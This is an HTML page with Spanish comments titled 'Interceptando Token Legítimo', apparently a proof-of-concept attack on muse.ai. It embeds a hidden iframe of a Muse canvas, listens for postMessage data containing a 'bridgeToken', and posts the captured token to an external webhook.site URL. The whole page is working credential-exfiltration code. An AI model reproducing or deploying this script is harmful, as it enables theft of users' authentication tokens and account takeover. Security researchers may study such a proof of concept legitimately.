<!DOCTYPE html>
<html>
<body>
    <h2>Interceptando Token Legítimo...</h2>
    
    <!-- Iframe invisible que carga un Canvas legítimo de Muse -->
    <iframe id="legitCanvas" src="https://muse.ai/s/contador" style="display:none;"></iframe>

    <script>
        const webhookUrl = "https://webhook.site/118f2af5-6014-4c45-ab14-1543fc773f54";

        // 1. Escuchamos los mensajes que el padre le envía al iframe legítimo
        window.addEventListener("message", (event) => {
            // Si el mensaje viene de muse.ai y contiene el token, lo robamos
            if (event.origin === "https://muse.ai" && JSON.stringify(event.data).includes("bridgeToken")) {
                const tokenData = JSON.stringify(event.data);
                
                // Exfiltramos el token al webhook
                fetch(`${webhookUrl}?token_stolen=true`, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: tokenData
                });
            }
        });
    </script>
</body>
</html>
